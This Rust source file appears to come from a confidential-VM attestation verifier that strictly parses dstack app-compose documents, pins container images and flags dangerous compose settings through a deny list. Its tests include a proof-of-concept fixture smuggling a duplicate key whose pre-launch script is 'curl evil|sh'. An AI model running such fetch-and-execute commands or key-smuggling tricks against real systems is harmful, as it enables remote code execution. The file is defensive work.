//! Parsing the measured app-compose document and extracting container images.
//!
//! On dstack the measured document is `app-compose.json`: a JSON wrapper whose
//! `docker_compose_file` field holds the docker-compose YAML as a string. Its
//! SHA-256 (over the exact bytes, never re-serialised) is the `compose-hash`
//! extended into RTMR3. The local mock setup produces the same shape.
//!
//! The image check is defence in depth on top of the compose-hash pin: it
//! makes the policy human-reviewable and catches unpinned images early. To
//! keep our reading of the YAML from diverging from Docker's, documents using
//! features where interpretations could differ are rejected outright: YAML
//! anchors, aliases and merge keys, `include`, `extends`, `build`, and any
//! service without a literal `image`.

use std::collections::BTreeMap;

use sha2::{Digest, Sha256};

use crate::policy::is_digest_pinned;
use crate::schema::ImageDigest;

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum ComposeError {
    #[error("app-compose is not a JSON object: {0}")]
    Json(String),
    #[error("app-compose has no string field `docker_compose_file`")]
    MissingComposeFile,
    #[error("docker_compose_file is not valid YAML: {0}")]
    Yaml(String),
    #[error("docker_compose_file uses YAML anchors, aliases or merge keys (line {0}); not allowed")]
    YamlIndirection(usize),
    #[error("docker_compose_file: {0}")]
    Structure(String),
}

/// SHA-256 of the exact app-compose bytes, as dstack computes `compose-hash`.
pub fn compose_hash(app_compose: &[u8]) -> [u8; 32] {
    Sha256::digest(app_compose).into()
}

/// Parse JSON, refusing an object with the same key twice (at any depth).
///
/// JSON parsers disagree on duplicates: serde_json keeps the last value,
/// others the first. dstack reads the measured document with its own
/// parser, so a document carrying two `docker_compose_file` or
/// `pre_launch_script` members could show us one and run the other. Every
/// read of the app-compose goes through here.
pub fn parse_json_strict(s: &str) -> Result<serde_json::Value, ComposeError> {
    use serde::de::DeserializeSeed as _;
    let mut de = serde_json::Deserializer::from_str(s);
    let v = strict_json::Strict
        .deserialize(&mut de)
        .map_err(|e| ComposeError::Json(e.to_string()))?;
    de.end().map_err(|e| ComposeError::Json(e.to_string()))?;
    Ok(v)
}

mod strict_json {
    use serde::de::{DeserializeSeed, Deserializer, Error, MapAccess, SeqAccess, Visitor};
    use serde_json::{Map, Number, Value};

    pub(super) struct Strict;

    impl<'de> DeserializeSeed<'de> for Strict {
        type Value = Value;
        fn deserialize<D: Deserializer<'de>>(self, d: D) -> Result<Value, D::Error> {
            d.deserialize_any(Strict)
        }
    }

    impl<'de> Visitor<'de> for Strict {
        type Value = Value;

        fn expecting(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            f.write_str("a JSON value")
        }
        fn visit_bool<E: Error>(self, v: bool) -> Result<Value, E> {
            Ok(Value::Bool(v))
        }
        fn visit_i64<E: Error>(self, v: i64) -> Result<Value, E> {
            Ok(Value::Number(v.into()))
        }
        fn visit_u64<E: Error>(self, v: u64) -> Result<Value, E> {
            Ok(Value::Number(v.into()))
        }
        fn visit_f64<E: Error>(self, v: f64) -> Result<Value, E> {
            Number::from_f64(v)
                .map(Value::Number)
                .ok_or_else(|| E::custom("non-finite number"))
        }
        fn visit_str<E: Error>(self, v: &str) -> Result<Value, E> {
            Ok(Value::String(v.to_owned()))
        }
        fn visit_unit<E: Error>(self) -> Result<Value, E> {
            Ok(Value::Null)
        }
        fn visit_seq<A: SeqAccess<'de>>(self, mut seq: A) -> Result<Value, A::Error> {
            let mut out = Vec::new();
            while let Some(v) = seq.next_element_seed(Strict)? {
                out.push(v);
            }
            Ok(Value::Array(out))
        }
        fn visit_map<A: MapAccess<'de>>(self, mut map: A) -> Result<Value, A::Error> {
            let mut out = Map::new();
            while let Some(k) = map.next_key::<String>()? {
                if out.contains_key(&k) {
                    return Err(A::Error::custom(format!("duplicate key `{k}`")));
                }
                let v = map.next_value_seed(Strict)?;
                out.insert(k, v);
            }
            Ok(Value::Object(out))
        }
    }
}

/// Extract the docker-compose YAML from an app-compose JSON document.
pub fn docker_compose_file(app_compose: &str) -> Result<String, ComposeError> {
    let v = parse_json_strict(app_compose)?;
    let obj = v
        .as_object()
        .ok_or_else(|| ComposeError::Json("top level is not an object".into()))?;
    obj.get("docker_compose_file")
        .and_then(|f| f.as_str())
        .map(str::to_owned)
        .ok_or(ComposeError::MissingComposeFile)
}

/// Reject anchors (`&a`), aliases (`*a`) and merge keys (`<<`). Lexical and
/// deliberately over-strict: a `&` or `*` directly followed by a name, after
/// whitespace or a flow indicator, is rejected even inside a quoted string.
fn reject_indirection(yaml: &str) -> Result<(), ComposeError> {
    for (i, line) in yaml.lines().enumerate() {
        if line.contains("<<") {
            return Err(ComposeError::YamlIndirection(i + 1));
        }
        let b = line.as_bytes();
        for (j, &c) in b.iter().enumerate() {
            if c != b'&' && c != b'*' {
                continue;
            }
            let prev_ok =
                j == 0 || matches!(b[j - 1], b' ' | b'\t' | b'[' | b'{' | b',' | b':' | b'-');
            let next_name = b
                .get(j + 1)
                .is_some_and(|n| n.is_ascii_alphanumeric() || *n == b'_' || *n == b'-');
            if prev_ok && next_name {
                return Err(ComposeError::YamlIndirection(i + 1));
            }
        }
    }
    Ok(())
}

/// Parse a docker-compose YAML document and return each service's image.
pub fn images(compose_yaml: &str) -> Result<Vec<ImageDigest>, ComposeError> {
    reject_indirection(compose_yaml)?;
    let doc: serde_yaml_ng::Value =
        serde_yaml_ng::from_str(compose_yaml).map_err(|e| ComposeError::Yaml(e.to_string()))?;
    let top = doc
        .as_mapping()
        .ok_or_else(|| ComposeError::Structure("top level is not a mapping".into()))?;
    for forbidden in ["include", "extends"] {
        if top.contains_key(forbidden) {
            return Err(ComposeError::Structure(format!(
                "top-level `{forbidden}` is not allowed"
            )));
        }
    }
    let services = top
        .get("services")
        .and_then(|s| s.as_mapping())
        .ok_or_else(|| ComposeError::Structure("no `services` mapping".into()))?;
    if services.is_empty() {
        return Err(ComposeError::Structure("no services".into()));
    }
    let mut out = BTreeMap::new();
    for (name, svc) in services {
        let name = name
            .as_str()
            .ok_or_else(|| ComposeError::Structure("non-string service name".into()))?;
        let svc = svc
            .as_mapping()
            .ok_or_else(|| ComposeError::Structure(format!("service `{name}` is not a mapping")))?;
        for forbidden in ["build", "extends"] {
            if svc.contains_key(forbidden) {
                return Err(ComposeError::Structure(format!(
                    "service `{name}` uses `{forbidden}`; only prebuilt images pinned by digest are allowed"
                )));
            }
        }
        let image = svc.get("image").and_then(|i| i.as_str()).ok_or_else(|| {
            ComposeError::Structure(format!("service `{name}` has no string `image`"))
        })?;
        out.insert(name.to_owned(), image.to_owned());
    }
    Ok(out
        .into_iter()
        .map(|(service, image)| ImageDigest { service, image })
        .collect())
}

/// Ways the measured app-compose could make the CVM run something that is
/// not fully described by the measured document and the policy. Returns one
/// message per problem; empty means self-contained.
///
/// * `pre_launch_script`: must be absent/empty, or hash to `script_sha256`.
/// * `init_script`: must be absent/empty.
/// * `allowed_envs`: must equal `allowed_envs` exactly (as a set).
/// * `$` interpolation in `docker_compose_file`: always rejected, so injected
///   env values can never reach the compose configuration.
pub fn config_problems(
    app_compose: &str,
    script_sha256: Option<&str>,
    allowed_envs: &[String],
) -> Result<Vec<String>, ComposeError> {
    let v = parse_json_strict(app_compose)?;
    if !v.is_object() {
        return Err(ComposeError::Json("top level is not an object".into()));
    }
    let mut out = Vec::new();
    let text = |key: &str| match v.get(key) {
        None | Some(serde_json::Value::Null) => Ok(None),
        Some(serde_json::Value::String(s)) if s.trim().is_empty() => Ok(None),
        Some(serde_json::Value::String(s)) => Ok(Some(s.clone())),
        Some(_) => Err(ComposeError::Json(format!("`{key}` is not a string"))),
    };
    match (text("pre_launch_script")?, script_sha256) {
        (None, None) => {}
        (None, Some(_)) => out.push("policy pins a pre-launch script but the app-compose has none".into()),
        (Some(_), None) => out.push(
            "app-compose has a pre-launch script but the policy pins none (runs code outside the image allowlist)"
                .into(),
        ),
        (Some(s), Some(want)) => {
            let got = hex::encode(Sha256::digest(s.as_bytes()));
            if !got.eq_ignore_ascii_case(want) {
                out.push(format!("pre-launch script hashes to {got}, policy pins {want}"));
            }
        }
    }
    // `init_script` is a string in older manifests and a list of platform
    // init scripts (e.g. "docker_cleanup") in Phala's manifest v3.
    match v.get("init_script") {
        None | Some(serde_json::Value::Null) => {}
        Some(serde_json::Value::Array(a)) if a.is_empty() => {}
        Some(serde_json::Value::String(s)) if s.trim().is_empty() => {}
        Some(other) => out.push(format!("app-compose has init scripts: {other}")),
    }
    let mut got: Vec<String> = match v.get("allowed_envs") {
        None | Some(serde_json::Value::Null) => Vec::new(),
        Some(serde_json::Value::Array(a)) => a
            .iter()
            .map(|x| x.as_str().map(str::to_owned))
            .collect::<Option<Vec<_>>>()
            .ok_or_else(|| ComposeError::Json("`allowed_envs` has a non-string".into()))?,
        Some(_) => return Err(ComposeError::Json("`allowed_envs` is not an array".into())),
    };
    let mut want = allowed_envs.to_vec();
    got.sort();
    got.dedup();
    want.sort();
    want.dedup();
    if got != want {
        out.push(format!(
            "app-compose allows encrypted env {got:?} (values unmeasured), policy allows {want:?}"
        ));
    }
    let yaml = docker_compose_file(app_compose)?;
    if let Some(line) = interpolation_line(&yaml) {
        out.push(format!(
            "docker_compose_file uses `$` variable interpolation (line {line}); values would come from unmeasured env"
        ));
    }
    Ok(out)
}

/// SHA-256 (hex) of the app-compose's `pre_launch_script`, if any.
pub fn pre_launch_script_sha256(app_compose: &str) -> Option<String> {
    let v = parse_json_strict(app_compose).ok()?;
    let s = v.get("pre_launch_script")?.as_str()?;
    if s.trim().is_empty() {
        return None;
    }
    Some(hex::encode(Sha256::digest(s.as_bytes())))
}

/// Top-level app-compose members that change what the CVM does or exposes
/// without appearing in the docker-compose file. Reported as observed
/// values; `public_logs` can be pinned by the policy.
pub const APP_COMPOSE_FLAGS: &[&str] = &[
    "public_logs",
    "public_sysinfo",
    "public_tcbinfo",
    "kms_enabled",
    "gateway_enabled",
    "tproxy_enabled",
    "local_key_provider_enabled",
    "key_provider",
    "key_provider_id",
    "no_instance_id",
    "secure_time",
    "docker_config",
    "storage_fs",
    "swap_size",
    "runner",
    "manifest_version",
    "features",
];

/// The [`APP_COMPOSE_FLAGS`] the document sets, as written.
pub fn app_compose_flags(
    app_compose: &str,
) -> Result<BTreeMap<String, serde_json::Value>, ComposeError> {
    let v = parse_json_strict(app_compose)?;
    Ok(APP_COMPOSE_FLAGS
        .iter()
        .filter_map(|k| v.get(*k).map(|x| ((*k).to_owned(), x.clone())))
        .collect())
}

/// A boolean app-compose flag; absent or null counts as false, as in dstack.
pub fn flag(app_compose: &str, name: &str) -> Result<bool, ComposeError> {
    match parse_json_strict(app_compose)?.get(name) {
        None | Some(serde_json::Value::Null) => Ok(false),
        Some(serde_json::Value::Bool(b)) => Ok(*b),
        Some(_) => Err(ComposeError::Json(format!("`{name}` is not a boolean"))),
    }
}

/// The app-compose `key_provider_id` (lowercase hex), if the document has a
/// non-empty one. dstack refuses to boot when it differs from the key
/// provider it actually used; the verifier cross-checks it against the
/// RTMR3 `key-provider` event.
pub fn key_provider_id(app_compose: &str) -> Result<Option<String>, ComposeError> {
    match parse_json_strict(app_compose)?.get("key_provider_id") {
        None | Some(serde_json::Value::Null) => Ok(None),
        Some(serde_json::Value::String(s)) if s.is_empty() => Ok(None),
        Some(serde_json::Value::String(s)) if s.bytes().all(|b| b.is_ascii_hexdigit()) => {
            Ok(Some(s.to_ascii_lowercase()))
        }
        Some(_) => Err(ComposeError::Json(
            "`key_provider_id` is not a hex string".into(),
        )),
    }
}

/// What the policy allows beyond the built-in rules of
/// [`hardening_problems`].
#[derive(Debug, Clone, Copy, Default)]
pub struct Hardening<'a> {
    /// `"<service>:<source>:<target>[:<mode>]"`, exactly as in the compose.
    pub allowed_bind_mounts: &'a [String],
    /// Services that may set `entrypoint`, `command` or `healthcheck`.
    pub command_override_services: &'a [String],
}

/// The one host path the published compose needs: the dstack guest agent
/// socket, on the sidecar only.
pub const DSTACK_SOCK_SERVICE: &str = "attest";
pub const DSTACK_SOCK_MOUNT: &str = "/var/run/dstack.sock:/var/run/dstack.sock";

/// Service keys accepted as they are (values are not security-relevant, or
/// only tighten the container).
const SERVICE_KEYS_PLAIN: &[&str] = &[
    "image",
    "restart",
    "environment",
    "ports",
    "expose",
    "configs",
    "user",
    "cap_drop",
    "read_only",
    "tmpfs",
    "depends_on",
    "container_name",
    "hostname",
    "labels",
    "networks",
    "init",
    "stop_grace_period",
    "stop_signal",
    "working_dir",
    "mem_limit",
    "mem_reservation",
    "cpus",
    "pids_limit",
];

/// Service keys that hand the container host-level access or unmeasured
/// input, with the reason shown to the user. Any key in neither list is
/// refused as well ("not reviewed"), so a new compose feature cannot slip
/// through; this list exists for the error messages and the documentation.
const SERVICE_KEYS_DENIED: &[(&str, &str)] = &[
    ("privileged", "full host (CVM) access"),
    ("cap_add", "adds Linux capabilities"),
    ("devices", "host devices"),
    ("device_cgroup_rules", "host devices"),
    (
        "network_mode",
        "shares the host or another network namespace",
    ),
    ("pid", "shares a PID namespace"),
    ("ipc", "shares an IPC namespace"),
    ("uts", "shares the UTS namespace"),
    ("userns_mode", "changes user-namespace isolation"),
    ("cgroup", "shares the host cgroup namespace"),
    ("cgroup_parent", "host cgroup placement"),
    (
        "env_file",
        "environment from a file outside the measured document",
    ),
    ("volumes_from", "inherits another container's mounts"),
    ("sysctls", "kernel parameters"),
    ("runtime", "alternative container runtime"),
    ("extra_hosts", "overrides name resolution"),
    ("dns", "overrides name resolution"),
    ("logging", "can ship logs off the CVM"),
    ("secrets", "content from outside the measured document"),
    ("post_start", "lifecycle hook runs extra commands"),
    ("pre_stop", "lifecycle hook runs extra commands"),
    ("develop", "development-only file sync"),
];

const OVERRIDE_KEYS: &[&str] = &["entrypoint", "command", "healthcheck"];

fn is_volume_name(s: &str) -> bool {
    let mut b = s.bytes();
    b.next().is_some_and(|c| c.is_ascii_alphanumeric())
        && b.all(|c| c.is_ascii_alphanumeric() || matches!(c, b'_' | b'.' | b'-'))
}

fn volume_problem(
    service: &str,
    vol: &serde_yaml_ng::Value,
    named: &[String],
    h: Hardening<'_>,
) -> Option<String> {
    if let Some(m) = vol.as_mapping() {
        // Long syntax: only named volumes and tmpfs. A bind must use the
        // short syntax so the policy can list it verbatim.
        let ty = m.get("type").and_then(|t| t.as_str()).unwrap_or("");
        let src = m.get("source").and_then(|s| s.as_str());
        return match (ty, src) {
            ("tmpfs", None) => None,
            ("volume", Some(s)) if named.iter().any(|n| n == s) => None,
            _ => Some(format!(
                "service `{service}` has a long-syntax mount of type `{ty}`; only `volume` (declared, named) and `tmpfs` are accepted"
            )),
        };
    }
    let Some(entry) = vol.as_str() else {
        return Some(format!("service `{service}` has a non-string volume entry"));
    };
    if entry.contains("docker.sock") {
        return Some(format!(
            "service `{service}` mounts the Docker socket (`{entry}`): control of every container"
        ));
    }
    let mut parts = entry.split(':');
    let src = parts.next().unwrap_or("");
    if parts.next().is_none() {
        // A lone container path: anonymous volume.
        return (!src.starts_with('/'))
            .then(|| format!("service `{service}` has a malformed volume `{entry}`"));
    }
    if is_volume_name(src) && named.iter().any(|n| n == src) {
        return None;
    }
    let dstack = service == DSTACK_SOCK_SERVICE && entry == DSTACK_SOCK_MOUNT;
    let listed = h
        .allowed_bind_mounts
        .iter()
        .any(|a| a.strip_prefix(service).and_then(|r| r.strip_prefix(':')) == Some(entry));
    if dstack || listed {
        return None;
    }
    Some(format!(
        "service `{service}` mounts host path or undeclared volume `{entry}`, which the policy does not allow"
    ))
}

fn security_opt_problem(service: &str, v: &serde_yaml_ng::Value) -> Option<String> {
    const OK: &[&str] = &[
        "no-new-privileges",
        "no-new-privileges:true",
        "no-new-privileges=true",
    ];
    let bad = match v.as_sequence() {
        Some(seq) => seq
            .iter()
            .find(|o| !o.as_str().is_some_and(|s| OK.contains(&s)))
            .map(|o| o.as_str().unwrap_or("<non-string>").to_owned()),
        None => Some("<not a list>".to_owned()),
    };
    bad.map(|b| {
        format!("service `{service}` sets security_opt `{b}`; only no-new-privileges is accepted (anything else loosens confinement)")
    })
}

/// A top-level named volume must be plain (docker-managed, on the CVM's
/// encrypted disk) or a tmpfs: `driver_opts` could otherwise turn a "named
/// volume" into a bind mount of any host path.
fn named_volume_problem(name: &str, v: &serde_yaml_ng::Value) -> Option<String> {
    if v.is_null() {
        return None;
    }
    let ok = v.as_mapping().is_some_and(|m| {
        m.iter().all(|(k, val)| match k.as_str() {
            Some("driver") => val.as_str() == Some("local"),
            Some("driver_opts") => val.as_mapping().is_some_and(|o| {
                let get = |k: &str| o.get(k).and_then(|x| x.as_str());
                o.len() == 3
                    && get("type") == Some("tmpfs")
                    && get("device") == Some("tmpfs")
                    && get("o").is_some_and(|opts| {
                        opts.split(',').all(|opt| {
                            matches!(opt, "nosuid" | "nodev" | "noexec")
                                || ["size=", "mode=", "uid=", "gid="]
                                    .iter()
                                    .any(|p| opt.starts_with(p))
                        })
                    })
            }),
            _ => false,
        })
    });
    (!ok).then(|| {
        format!("volume `{name}` has options other than a plain or tmpfs local volume (could map a host path)")
    })
}

/// Settings in the measured compose that would give a container access to
/// the CVM host, to other containers' secrets or to unmeasured input, even
/// though every image is pinned. One message per problem.
///
/// Built-in rules (see `SERVICE_KEYS_DENIED` for the denied keys):
///
/// * top level: only `name`, `version`, `services`, `configs`, `volumes`,
///   `networks`; configs must be inline `content`; volumes plain or tmpfs;
///   networks without options;
/// * per service: `privileged`, `cap_add`, `devices`, `network_mode`, `pid`,
///   `ipc`, `env_file`, ... are refused; so is any key the verifier has not
///   reviewed; `security_opt` may only be `no-new-privileges`;
/// * mounts: named volumes and tmpfs only; the single host path allowed is
///   [`DSTACK_SOCK_MOUNT`] on service [`DSTACK_SOCK_SERVICE`], plus whatever
///   the policy lists; the Docker socket never;
/// * `entrypoint`, `command`, `healthcheck` only for services the policy
///   lists.
///
/// This is a list of known pitfalls, NOT a proof that a compose is safe:
/// the compose hash pins the whole document, and a policy is only as good
/// as the review of that document.
pub fn hardening_problems(
    app_compose: &str,
    h: Hardening<'_>,
) -> Result<Vec<String>, ComposeError> {
    let yaml = docker_compose_file(app_compose)?;
    reject_indirection(&yaml)?;
    let doc: serde_yaml_ng::Value =
        serde_yaml_ng::from_str(&yaml).map_err(|e| ComposeError::Yaml(e.to_string()))?;
    let top = doc
        .as_mapping()
        .ok_or_else(|| ComposeError::Structure("top level is not a mapping".into()))?;
    let mut out = Vec::new();
    let mut named = Vec::new();
    for (k, v) in top {
        let k = k
            .as_str()
            .ok_or_else(|| ComposeError::Structure("non-string top-level key".into()))?;
        let entries = || v.as_mapping().into_iter().flatten();
        match k {
            "name" | "version" | "services" => {}
            "volumes" => {
                for (name, spec) in entries() {
                    let name = name.as_str().unwrap_or("<non-string>");
                    named.push(name.to_owned());
                    out.extend(named_volume_problem(name, spec));
                }
            }
            "configs" => {
                for (name, spec) in entries() {
                    let inline = spec.as_mapping().is_some_and(|m| {
                        m.len() == 1 && m.get("content").is_some_and(|c| c.is_string())
                    });
                    if !inline {
                        out.push(format!(
                            "config `{}` is not inline `content` (would read a file or env outside the measured document)",
                            name.as_str().unwrap_or("<non-string>")
                        ));
                    }
                }
            }
            "networks" => {
                for (name, spec) in entries() {
                    if !(spec.is_null() || spec.as_mapping().is_some_and(|m| m.is_empty())) {
                        out.push(format!(
                            "network `{}` has options (external or host networking is not accepted)",
                            name.as_str().unwrap_or("<non-string>")
                        ));
                    }
                }
            }
            other => out.push(format!("top-level `{other}` is not accepted")),
        }
    }
    let services = top
        .get("services")
        .and_then(|s| s.as_mapping())
        .ok_or_else(|| ComposeError::Structure("no `services` mapping".into()))?;
    for (name, svc) in services {
        let name = name
            .as_str()
            .ok_or_else(|| ComposeError::Structure("non-string service name".into()))?;
        let svc = svc
            .as_mapping()
            .ok_or_else(|| ComposeError::Structure(format!("service `{name}` is not a mapping")))?;
        for (k, v) in svc {
            let k = k.as_str().ok_or_else(|| {
                ComposeError::Structure(format!("service `{name}` has a non-string key"))
            })?;
            if SERVICE_KEYS_PLAIN.contains(&k) {
                continue;
            }
            if let Some((_, why)) = SERVICE_KEYS_DENIED.iter().find(|(d, _)| *d == k) {
                out.push(format!("service `{name}` sets `{k}` ({why})"));
            } else if OVERRIDE_KEYS.contains(&k) {
                if !h.command_override_services.iter().any(|s| s == name) {
                    out.push(format!(
                        "service `{name}` overrides `{k}` and the policy does not list it (command_override_services)"
                    ));
                }
            } else if k == "security_opt" {
                out.extend(security_opt_problem(name, v));
            } else if k == "volumes" {
                match v.as_sequence() {
                    Some(seq) => out.extend(
                        seq.iter()
                            .filter_map(|e| volume_problem(name, e, &named, h)),
                    ),
                    None => out.push(format!("service `{name}`: `volumes` is not a list")),
                }
            } else {
                out.push(format!(
                    "service `{name}` sets `{k}`, which this verifier has not reviewed as harmless"
                ));
            }
        }
    }
    Ok(out)
}

/// First line with compose variable interpolation (`$VAR`, `${VAR}`);
/// `$$` is a literal dollar and allowed. Deliberately lexical: a `$` in a
/// YAML comment is rejected too (keep templates free of it) rather than
/// risk misjudging where a comment starts.
fn interpolation_line(yaml: &str) -> Option<usize> {
    for (i, line) in yaml.lines().enumerate() {
        let b = line.as_bytes();
        let mut j = 0;
        while j < b.len() {
            if b[j] == b'$' {
                if b.get(j + 1) == Some(&b'$') {
                    j += 2;
                    continue;
                }
                return Some(i + 1);
            }
            j += 1;
        }
    }
    None
}

/// Result of checking images against an allowlist.
#[derive(Debug, PartialEq, Eq)]
pub enum ImageProblem {
    NotPinned { service: String, image: String },
    NotAllowlisted { service: String, image: String },
}

impl std::fmt::Display for ImageProblem {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ImageProblem::NotPinned { service, image } => {
                write!(
                    f,
                    "service `{service}` image `{image}` is not pinned by @sha256 digest"
                )
            }
            ImageProblem::NotAllowlisted { service, image } => {
                write!(
                    f,
                    "service `{service}` image `{image}` is not in the policy allowlist"
                )
            }
        }
    }
}

/// Every image must be digest-pinned and its exact (service, image) pair
/// must appear in the allowlist.
pub fn check_images(images: &[ImageDigest], allow: &[(String, String)]) -> Vec<ImageProblem> {
    let mut problems = Vec::new();
    for img in images {
        if !is_digest_pinned(&img.image) {
            problems.push(ImageProblem::NotPinned {
                service: img.service.clone(),
                image: img.image.clone(),
            });
        } else if !allow
            .iter()
            .any(|(s, i)| *s == img.service && *i == img.image)
        {
            problems.push(ImageProblem::NotAllowlisted {
                service: img.service.clone(),
                image: img.image.clone(),
            });
        }
    }
    problems
}

#[cfg(test)]
mod tests {
    use super::*;

    const D: &str = "1111111111111111111111111111111111111111111111111111111111111111";

    fn yaml(img: &str) -> String {
        format!("services:\n  vw:\n    image: {img}\n  proxy:\n    image: caddy@sha256:{D}\n")
    }

    #[test]
    fn extracts_images_sorted() {
        let imgs = images(&yaml(&format!("vaultwarden/server@sha256:{D}"))).unwrap_or_default();
        assert_eq!(imgs.len(), 2);
        assert_eq!(imgs[0].service, "proxy");
        assert_eq!(imgs[1].service, "vw");
    }

    #[test]
    fn rejects_anchor_alias_merge() {
        let y = format!(
            "x-common: &c\n  restart: always\nservices:\n  vw:\n    <<: *c\n    image: a@sha256:{D}\n"
        );
        assert_eq!(images(&y), Err(ComposeError::YamlIndirection(1)));
        let y2 = format!("services:\n  vw:\n    image: *img\n  p:\n    image: a@sha256:{D}\n");
        assert_eq!(images(&y2), Err(ComposeError::YamlIndirection(3)));
    }

    #[test]
    fn rejects_build_and_missing_image() {
        let y = "services:\n  vw:\n    build: .\n".to_owned();
        assert!(matches!(images(&y), Err(ComposeError::Structure(_))));
        let y = "services:\n  vw:\n    restart: always\n".to_owned();
        assert!(matches!(images(&y), Err(ComposeError::Structure(_))));
        let y = format!("include:\n  - other.yml\nservices:\n  vw:\n    image: a@sha256:{D}\n");
        assert!(matches!(images(&y), Err(ComposeError::Structure(_))));
    }

    #[test]
    fn image_check_reports_specific_problem() {
        let imgs = vec![
            ImageDigest {
                service: "vw".into(),
                image: "vaultwarden/server:latest".into(),
            },
            ImageDigest {
                service: "proxy".into(),
                image: format!("caddy@sha256:{D}"),
            },
        ];
        let p = check_images(&imgs, &[]);
        assert_eq!(p.len(), 2);
        assert!(matches!(p[0], ImageProblem::NotPinned { .. }));
        assert!(matches!(p[1], ImageProblem::NotAllowlisted { .. }));
        let ok = check_images(&imgs[1..], &[("proxy".into(), format!("caddy@sha256:{D}"))]);
        assert!(ok.is_empty());
    }

    #[test]
    fn app_compose_wrapper() {
        let doc = serde_json::json!({"docker_compose_file": "services: {}"}).to_string();
        assert_eq!(docker_compose_file(&doc).as_deref(), Ok("services: {}"));
        assert_eq!(
            docker_compose_file("{}"),
            Err(ComposeError::MissingComposeFile)
        );
    }

    #[test]
    fn config_problems_detected() {
        let clean = serde_json::json!({
            "docker_compose_file": "services: {}\n", "pre_launch_script": "", "allowed_envs": []
        })
        .to_string();
        assert!(config_problems(&clean, None, &[]).unwrap().is_empty());
        let v3 = serde_json::json!({"docker_compose_file": "services: {}\n", "init_script": []})
            .to_string();
        assert!(config_problems(&v3, None, &[]).unwrap().is_empty());
        let v3i = serde_json::json!({"docker_compose_file": "services: {}\n", "init_script": ["env_merge"]}).to_string();
        assert_eq!(config_problems(&v3i, None, &[]).unwrap().len(), 1);

        let script = "docker login ghcr.io";
        let with_script = serde_json::json!({
            "docker_compose_file": "services: {}\n", "pre_launch_script": script,
            "allowed_envs": ["TOKEN"]
        })
        .to_string();
        let h = hex::encode(Sha256::digest(script.as_bytes()));
        assert_eq!(
            pre_launch_script_sha256(&with_script).as_deref(),
            Some(h.as_str())
        );
        assert_eq!(config_problems(&with_script, None, &[]).unwrap().len(), 2);
        assert!(
            config_problems(&with_script, Some(&h), &["TOKEN".into()])
                .unwrap()
                .is_empty()
        );
        assert_eq!(
            config_problems(&with_script, Some(&"00".repeat(32)), &["TOKEN".into()])
                .unwrap()
                .len(),
            1
        );
        assert_eq!(
            config_problems(&with_script, Some(&h), &["OTHER".into()])
                .unwrap()
                .len(),
            1
        );
        assert_eq!(config_problems(&clean, Some(&h), &[]).unwrap().len(), 1);

        // Interpolation is rejected even when env names are allowed.
        let interp = serde_json::json!({
            "docker_compose_file": "services:\n  a:\n    environment:\n      X: ${TOKEN}\n",
            "allowed_envs": ["TOKEN"]
        })
        .to_string();
        assert_eq!(
            config_problems(&interp, None, &["TOKEN".into()])
                .unwrap()
                .len(),
            1
        );
        let literal = serde_json::json!({"docker_compose_file": "x: \"$$HOME\"\n"}).to_string();
        assert!(config_problems(&literal, None, &[]).unwrap().is_empty());
    }

    /// Review PoC: two `docker_compose_file` / `pre_launch_script` members.
    #[test]
    fn duplicate_json_keys_rejected() {
        let doc = format!(
            r#"{{"docker_compose_file":"services:\n  a:\n    image: evil:latest\n","pre_launch_script":"curl evil|sh","docker_compose_file":"services:\n  a:\n    image: a/b@sha256:{D}\n","pre_launch_script":""}}"#
        );
        for r in [
            docker_compose_file(&doc).map(|_| ()),
            config_problems(&doc, None, &[]).map(|_| ()),
            hardening_problems(&doc, Hardening::default()).map(|_| ()),
            app_compose_flags(&doc).map(|_| ()),
            flag(&doc, "public_logs").map(|_| ()),
            key_provider_id(&doc).map(|_| ()),
        ] {
            assert!(
                matches!(&r, Err(ComposeError::Json(m)) if m.contains("duplicate key")),
                "{r:?}"
            );
        }
        assert_eq!(pre_launch_script_sha256(&doc), None);
        // Nested objects and arrays are covered too; trailing data is refused.
        for bad in [
            r#"{"a":{"b":1,"b":2}}"#,
            r#"{"a":[{"b":1,"b":2}]}"#,
            r#"{"a":1} {"a":2}"#,
        ] {
            assert!(parse_json_strict(bad).is_err(), "{bad}");
        }
        let ok = parse_json_strict(r#"{"a":{"b":1},"c":[{"b":1},{"b":2}],"d":1.5,"e":null}"#);
        assert_eq!(
            ok,
            Ok(serde_json::json!({"a":{"b":1},"c":[{"b":1},{"b":2}],"d":1.5,"e":null}))
        );
    }

    /// YAML shapes where our reading and Docker's could differ must not
    /// yield an image list (review PoC `poc_yaml_oddities`).
    #[test]
    fn yaml_oddities_rejected() {
        for y in [
            format!("services:\n  a:\n    image: a/b@sha256:{D}\n  a:\n    image: evil\n"),
            format!(
                "services:\n  a:\n    image: a/b@sha256:{D}\nservices:\n  a:\n    image: evil\n"
            ),
            format!(
                "services:\n  a:\n    image: a/b@sha256:{D}\n---\nservices:\n  a:\n    image: evil\n"
            ),
            format!("services:\n  a:\n    image: a/b@sha256:{D}\n  1:\n    image: evil\n"),
            format!("services:\n  a:\n    image: a/b@sha256:{D}\n  true:\n    build: .\n"),
        ] {
            assert!(images(&y).is_err(), "{y:?} => {:?}", images(&y));
        }
    }

    fn wrap(yaml: &str) -> String {
        serde_json::json!({ "docker_compose_file": yaml }).to_string()
    }

    fn hard(yaml: &str) -> Vec<String> {
        hardening_problems(&wrap(yaml), Hardening::default()).unwrap()
    }

    /// The compose of every published release, and the current template,
    /// must pass the hardening rules unchanged.
    #[test]
    fn published_composes_pass_hardening() {
        let dir = concat!(env!("CARGO_MANIFEST_DIR"), "/../");
        for f in [
            "policy/2026.11.0-phala-dev.app-compose.json",
            "policy/2026.11.1-phala-dev.app-compose.json",
            "policy/2026.11.2-phala-dev.app-compose.json",
        ] {
            let doc = std::fs::read_to_string(format!("{dir}{f}")).unwrap();
            let p = hardening_problems(&doc, Hardening::default()).unwrap();
            assert!(p.is_empty(), "{f}: {p:?}");
        }
        let doc =
            std::fs::read_to_string(format!("{dir}policy/2026.11.2-phala-dev.app-compose.json"))
                .unwrap();
        assert_eq!(flag(&doc, "public_logs"), Ok(true));
        assert_eq!(flag(&doc, "public_sysinfo"), Ok(false));
        assert_eq!(flag(&doc, "no_such_flag"), Ok(false));
        let flags = app_compose_flags(&doc).unwrap();
        assert_eq!(flags["kms_enabled"], true);
        assert_eq!(flags["secure_time"], false);
        assert!(key_provider_id(&doc).unwrap().unwrap().starts_with("3059"));

